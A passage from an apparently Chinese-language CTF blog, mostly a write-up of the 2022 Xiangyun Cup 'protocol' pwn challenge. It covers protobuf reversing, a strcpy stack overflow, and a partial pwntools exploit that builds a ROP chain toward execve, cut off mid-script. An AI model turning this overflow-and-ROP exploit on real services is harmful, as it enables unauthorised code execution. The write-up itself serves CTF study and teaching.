class="keyword">if</span>(<span class="built_in">strcmp</span>(cmd,<span class="string">&quot;n&quot;</span>) == <span class="number">0</span> || <span class="built_in">strcmp</span>(cmd,<span class="string">&quot;ni&quot;</span>) == <span class="number">0</span>)&#123;</span><br><span class="line">                runStepIn(child);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">strcmp</span>(cmd,<span class="string">&quot;r&quot;</span>) == <span class="number">0</span> || <span class="built_in">strcmp</span>(cmd,<span class="string">&quot;reg&quot;</span>) == <span class="number">0</span>)&#123;</span><br><span class="line">                showReg(child,<span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">strcmp</span>(cmd,<span class="string">&quot;s&quot;</span>) == <span class="number">0</span> || <span class="built_in">strcmp</span>(cmd,<span class="string">&quot;show&quot;</span>) == <span class="number">0</span>)&#123;</span><br><span class="line">                showMemory(child);</span><br><span class="line">            &#125; </span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">strcmp</span>(cmd,<span class="string">&quot;q&quot;</span>) == <span class="number">0</span> || <span class="built_in">strcmp</span>(cmd,<span class="string">&quot;quit&quot;</span>) == <span class="number">0</span>)&#123;</span><br><span class="line">                errPrint(<span class="string">&quot;Exit\nThanks&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/11/03/%E7%A5%A5%E4%BA%91%E6%9D%AFCTF2022/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/11/03/%E7%A5%A5%E4%BA%91%E6%9D%AFCTF2022/" class="post-title-link" itemprop="url">祥云杯CTF2022</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-11-03 23:35:27" itemprop="dateCreated datePublished" datetime="2022-11-03T23:35:27+08:00">2022-11-03</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2022-12-19 18:00:36" itemprop="dateModified" datetime="2022-12-19T18:00:36+08:00">2022-12-19</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Competition/" itemprop="url" rel="index"><span itemprop="name">Competition</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>28k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>25 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="protocol"><a href="#protocol" class="headerlink" title="protocol"></a>protocol</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">protocol: ELF <span class="number">64</span>-bit LSB executable, x86<span class="number">-64</span>, version <span class="number">1</span> (GNU/Linux), statically linked, BuildID[sha1]=<span class="number">805</span>aff424a7691b51b56996dad2d4c386ab3b31e, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, stripped</span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (<span class="number">0x400000</span>)</span><br></pre></td></tr></table></figure>
<ul>
<li>64位，statically，开了 NX</li>
</ul>
<p>逆向出来没有符号，不过搜索到一个关键的字符串：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sub_43ADCC(v7, <span class="number">3LL</span>, <span class="string">&quot;/usr/local/include/google/protobuf/metadata_lite.h&quot;</span>, <span class="number">0x4A</span>LL);</span><br></pre></td></tr></table></figure>
<ul>
<li>搜索到一个叫做 protobuf 的程序</li>
</ul>
<p>然后在 IDA 中搜索其版本信息</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">v5 = sub_43A79E(v4, <span class="string">&quot; of the Protocol Buffer runtime library, but the installed version is &quot;</span>);</span><br><span class="line">sub_43A53E((__int64)v21, <span class="number">3021008</span>);</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">v4 = a2 / <span class="number">1000000</span>;</span><br><span class="line">v5 = a2 / <span class="number">1000</span> % <span class="number">1000</span>;</span><br><span class="line">v6 = a2 % <span class="number">1000</span>;</span><br><span class="line">sub_67F040((__int64)v7, <span class="number">0x80</span>LL, (__int64)<span class="string">&quot;%d.%d.%d&quot;</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(a2 / <span class="number">1000000</span>), v5, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(a2 % <span class="number">1000</span>));</span><br></pre></td></tr></table></figure>
<ul>
<li>计算得：version 3.21.8 - <a target="_blank" rel="noopener" href="https://github.com/protocolbuffers/protobuf/releases/tag/v21.8">Release Protocol Buffers v21.8(github.com)</a> </li>
</ul>
<p><strong>环境搭建</strong></p>
<p>先编译 protobuf：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">cd</span> protobuf-3.21.8/</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> ./autogen.sh</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> ./configure --prefix=/usr/<span class="built_in">local</span>/protobuf</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> make -j8</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo make install</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo ldconfig</span> </span><br></pre></td></tr></table></figure>
<ul>
<li>配置环境变量：</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/profile</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">#############################################</span></span></span><br><span class="line">export PATH=$PATH:/usr/local/protobuf/bin/</span><br><span class="line">export PKG_CONFIG_PATH=/usr/local/protobuf/lib/pkgconfig/</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">#############################################</span></span></span><br><span class="line">source /etc/profile</span><br></pre></td></tr></table></figure>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sudo vim ~/.profile</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">#############################################</span></span></span><br><span class="line">export PATH=$PATH:/usr/local/protobuf/bin/</span><br><span class="line">export PKG_CONFIG_PATH=/usr/local/protobuf/lib/pkgconfig/</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">#############################################</span></span></span><br><span class="line">source ~/.profile</span><br></pre></td></tr></table></figure>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/ld.so.conf</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">#############################################</span></span></span><br><span class="line">/usr/local/protobuf/lib</span><br></pre></td></tr></table></figure>
<ul>
<li>安装好之后就会有如下输出：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  protocol protoc --version                                                            </span><br><span class="line">libprotoc <span class="number">3.21</span><span class="number">.8</span></span><br></pre></td></tr></table></figure>
<p>在 <code>/protobuf-3.21.8/examples/</code> 中有 Cpp 的测试案例（记得在 Makefile 加上 “-g -static”）</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> make cpp -j8</span></span><br></pre></td></tr></table></figure>
<p>使用 Bindiff 修复一下符号：（虽然修不了 STL 但至少可以标识一下）</p>
<img src="/2022/11/03/%E7%A5%A5%E4%BA%91%E6%9D%AFCTF2022/1667016936344.png" class width="1667016936344">  
<p>我们还需要下载 python protobuf，然后用如下命令进行安装：（写 exp 脚本时会用到）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo python3 setup.py build </span><br><span class="line">sudo python3 setup.py install </span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">➜  python python3                  </span><br><span class="line">Python <span class="number">3.8</span><span class="number">.10</span> (<span class="keyword">default</span>, Jun <span class="number">22</span> <span class="number">2022</span>, <span class="number">20</span>:<span class="number">18</span>:<span class="number">18</span>) </span><br><span class="line">[GCC <span class="number">9.4</span><span class="number">.0</span>] on linux</span><br><span class="line">Type <span class="string">&quot;help&quot;</span>, <span class="string">&quot;copyright&quot;</span>, <span class="string">&quot;credits&quot;</span> <span class="keyword">or</span> <span class="string">&quot;license&quot;</span> <span class="keyword">for</span> more information.</span><br><span class="line">&gt;&gt;&gt; <span class="keyword">import</span> google.protobuf </span><br><span class="line">&gt;&gt;&gt; </span><br></pre></td></tr></table></figure>
<p><strong>漏洞分析</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> buf[<span class="number">256</span>]; <span class="comment">// [rsp+140h] [rbp-140h] MAPDST BYREF</span></span><br><span class="line">__int64 obj; <span class="comment">// rax MAPDST</span></span><br><span class="line"></span><br><span class="line">    obj = sub_4078D6((__int64)v14);</span><br><span class="line">    obj = ZNSt7__cxx1112basic_stringIwSt11char_traitsIwESaIwEE12_Alloc_hiderC2EPwOS3_(obj);</span><br><span class="line">    j_strcpy_ifunc(buf, obj);</span><br><span class="line">    obj = sub_4078F4(v14);</span><br><span class="line">    obj = ZNSt7__cxx1112basic_stringIwSt11char_traitsIwESaIwEE12_Alloc_hiderC2EPwOS3_(obj);</span><br><span class="line">    j_strcpy_ifunc(buf, obj);</span><br></pre></td></tr></table></figure>
<ul>
<li><code>j_strcpy_ifunc</code> 造成栈溢出</li>
</ul>
<p><strong>入侵思路</strong></p>
<p>想要与 protobuf 程序进行交互，必须先找到 protobuf 的格式，以下 Github 项目可以完成这个工作： </p>
<ul>
<li><a target="_blank" rel="noopener" href="https://github.com/marin-m/pbtk">marin-m/pbtk (github.com)</a> </li>
<li>使用过程如下：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">➜  protocol ./pbtk/extractors/from_binary.py protocol </span><br><span class="line"></span><br><span class="line">[+] Wrote <span class="number">2</span> .proto files to <span class="string">&quot;.&quot;</span>.</span><br></pre></td></tr></table></figure>
<ul>
<li>在生成的 <code>ctf.proto</code> 文件中就可以找到答案：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">➜  protocol cat ctf.proto </span><br><span class="line">syntax = <span class="string">&quot;proto2&quot;</span>;</span><br><span class="line"></span><br><span class="line">package ctf;</span><br><span class="line"></span><br><span class="line">message pwn &#123;</span><br><span class="line">    optional bytes username = <span class="number">1</span>;</span><br><span class="line">    optional bytes password = <span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然后参考 <code>protobuf-3.21.8/examples</code> 中的 python 使用案例，把 <code>ctf.proto</code> 文件处理为 python 可以识别的形式：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜  protocol protoc --python_out=. ctf.proto </span><br></pre></td></tr></table></figure>
<ul>
<li>在当前目录中多了一个 <code>ctf_pb2.py</code>，这就是我们需要的目标库</li>
</ul>
<p>入侵的思路比较简单，就是利用栈溢出写入一个 ROP（这是 statically 文件，只能打 syscall）</p>
<p>只有一个问题比较烦人：<code>j_strcpy_ifunc</code> 会被 “\x00” 截断</p>
<p>解决的办法也比较暴力，分批次从下往上写 ROP 链，每次写入时前面的字符都填入“b”（需要利用 <code>j_strcpy_ifunc</code> 末尾补“\x00”的特性来写入“\x00”）</p>
<p>完整 exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ctf_pb2</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&#x27;./protocol&#x27;</span></span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">64</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">32</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(challenge)</span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(challenge)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;chuj.top&#x27;</span>, <span class="string">&#x27;53178&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    gdb.attach(p,<span class="string">&quot;b* 0x407845\nb* 0x407701\n&quot;</span>)</span><br><span class="line">    <span class="comment">#gdb.attach(p,&quot;b *$rebase()\nb *$rebase()&quot;)</span></span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span>(<span class="params">username, password</span>):</span></span><br><span class="line">    pwn = ctf_pb2.pwn()</span><br><span class="line">    pwn.username = username</span><br><span class="line">    pwn.password = password</span><br><span class="line">    login = pwn.SerializeToString()</span><br><span class="line">    p.sendafter(<span class="string">&quot;Login: &quot;</span>, login)</span><br><span class="line"></span><br><span class="line">pop_rax_ret = <span class="number">0x00000000005bdb8a</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x0000000000404982</span></span><br><span class="line">pop_rsi_ret = <span class="number">0x0000000000588bbe</span></span><br><span class="line">pop_rdx_ret = <span class="number">0x000000000040454f</span></span><br><span class="line">syscall_ret = <span class="number">0x68f0a4</span></span><br><span class="line">bss_addr = <span class="number">0x81A2A0</span> + <span class="number">0x200</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">payload =  b&#x27;a&#x27;*0x148 </span></span><br><span class="line"><span class="string">payload += p64(pop_rdi_ret) + p64(0)</span></span><br><span class="line"><span class="string">payload += p64(pop_rsi_ret) + p64(bss_addr) </span></span><br><span class="line"><span class="string">payload += p64(pop_rdx_ret) + p64(0x10)   </span></span><br><span class="line"><span class="string">payload += p64(pop_rax_ret) + p64(0)</span></span><br><span class="line"><span class="string">payload += p64(syscall_ret) </span></span><br><span class="line"><span class="string">payload += p64(pop_rdi_ret) + p64(bss_addr) </span></span><br><span class="line"><span class="string">payload += p64(pop_rsi_ret) + p64(0) </span></span><br><span class="line"><span class="string">payload += p64(pop_rdx_ret) + p64(0) </span></span><br><span class="line"><span class="string">payload += p64(pop_rax_ret) + p64(59) </span></span><br><span class="line"><span class="string">payload += p64(syscall_ret)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x148</span> + <span class="string">b&#x27;b&#x27;</span>*<span class="number">0x8</span>*<span class="number">17</span> <span class="comment"># p64(syscall_ret)</span></span><br><span class="line">payload += p8(<span class="number">0xa4</span>)+p8(<span class="number">0xf0</span>)+p8(<span class="number">0x68</span>)   </span><br><span class="line">write(payload, <span class="string">b&#x27;admin&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x148</span> + <span class="string">b&#x27;b&#x27;</span>*<span class="number">0x8</span>*<span class="number">16</span> + (<span class="number">7</span>-i)*<span class="string">b&#x27;c&#x27;</span></span><br><span class="line">    write(payload, <span class="string">b&#x27;admin&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x148</span> + <span class="string">b&#x27;b&#x27;</span>*<span class="number">0x8</span>*<span class="number">16</span> <span class="comment"># p64(59) </span></span><br><span class="line">payload += p8(<span class="number">59</span>)</span><br><span class="line">write(payload, <span class="string">b&#x27;admin&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x148</span> + <span class="string">b&#x27;b&#x27;</span>*<span class="number">0x8</span>*<span class="number">15</span> + (<span class="number">7</span>-i)*<span class="string">b&#x27;c&#x27;</span></span><br><span class="line">    write(payload, <span class="string">b&#x27;admin&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x148</span> + <span class="string">b&#x27;b&#x27;</span>*<span class="number">0x8</span>*<span class="number">15</span> <span class="comment"># p64(pop_rax_ret) </span></span><br><span class="line">payload += p8(<span class="number">0x8a</span>)+p8(<span class="number">0xdb</span>)+p8(<span class="number">0x5b</span>)</span><br><span class="line">write(payload, <span class="string">b&#x27;admin&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x148</span> + <span class="string">b&#x27;b&#x27;</span>*<span class="number">0x8</span>*<span class="number">14</span> + (<span class="number">7</span>-i)*<span class="string">b&#x27;c&#x27;</span></span><br><span class="line">    write(payload, <span class="string">b&#x27;admin&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x148</span> + <span class="string">b&#x27;b&#x27;</span>*<span class="number">0x8</span>*<span class="number">14</span> <span class="comment"># p64(0) </span></span><br><span class="line">write(payload, <span class="string">b&#x27;admin&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x148</span> + <span class="string">b&#x27;b&#x27;</span>*<span class="number">0x8</span>*<span class="number">13</span> + (<span class="number">7</span>-i)*<span class="string">b&#x27;c&#x27;</span></span><br><span class="line">    write(payload, <span class="string">b&#x27;admin&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x148</span> + <span class="string">b&#x27;b&#x27;</span>*<span class="number">0x8</span>*<span class="number">13</span> <span class="comment"># p64(pop_rdx_ret)</span></span><br><span class="line">payload +=  p8(<span class="number">0x4f</span>)+p8(<span class="number">0x45</span>)+p8(<span class="number">0x40</span>)</span><br><span class="line">write(payload, <span class="string">b&#x27;admin&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x148</span> + <span class="string">b&#x27;b&#x27;</span>*<span class="number">0x8</span>*<span class="number">12</span> + (<span class="number">7</span>-i)*<span class="string">b&#x27;c&#x27;</span></span><br><span class="line">    write(payload, <span class="string">b&#x27;admin&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x148</span> + <span class="string">b&#x27;b&#x27;</span>*<span class="number">0x8</span>*<span class="number">12</span> <span class="comment"># p64(0) </span></span><br><span class="line">write(payload, <span class="string">b&#x27;admin&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x148</span> + <span class="string">b&#x27;b&#x27;</span>*<span class="number">0x8</span>*<span class="number">11</span> + (<span class="number">7</span>-i)*<span class="string">b&#x27;c&#x27;</span></span><br><span class="line">    write(payload, <span class="string">b&#x27;admin&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x148</span> + <span class="string">b&#x27;b&#x27;</span>*<span class="number">0x8</span>*<span class="number">11</span> <span class="comment"># p64(pop_rsi_ret) </span></span><br><span class="line">payload += p8(<span class="number">0xbe</span>)+p8(<span class="number">0x8b</span>)+p8(<span class="number">0x58</span>)</span><br><span class="line">write(payload, <span class="string">b&#x27;admin&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x148</span> + <span class="string">b&#x27;b&#x27;</span>*<span class="number">0x8</span>*<span class="number">10</span> + (<span class="number">7</span>-i)*<span class="string">b&#x27;c&#x27;</span></span><br><span class="line">    write(payload, <span class="string">b&#x27;admin&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x148</span> + <span class="string">b&#x27;b&#x27;</span>*<span class="number">0x8</span>*<span class="number">10</span> <span class="comment"># p64(bss_addr) </span></span><br><span class="line">payload += p8(<span class="number">0xa0</span>)+p8(<span class="number">0xa4</span>)+p8(<span class="number">0x81</span>)</span><br><span class="line">write(payload, <span class="string">b&#x27;admin&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x148</span> + <span class="string">b&#x27;b&#x27;</span>*<span class="number">0x8</span>*<span class="number">9</span> + (<span class="number">7</span>-i)*<span class="string">b&#x27;c&#x27;</span></span><br><span class="line">    write(payload, <span class="string">b&#x27;admin&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x148</span> + <span class="string">b&#x27;b&#x27;</span>*<span class="number">0x8</span>*<span class="number">9</span> <span class="comment"># p64(pop_rdi_ret) </span></span><br><span class="line">payload += p8(<span class="number">0x82</span>)+p8(<span class="number">0x49</span>)+p8(<span class="number">0x40</span>)</span><br><span class="line">write(payload, <span class="string">b&#x27;admin&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x148</span> + <span class="string">b&#x27;b&#x27;</span>*<span class="number">0x8</span>*<span class="number">8</span> + (<span class="number">7</span>-i)*<span class="string">b&#x27;c&#x27;</span></span><br><span class="line">    write(payload, <span class="string">b&#x27;admin&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x148</span> + <span class="string">b&#x27;b&#x27;</span>*<span class="number">0x8</span>*<span 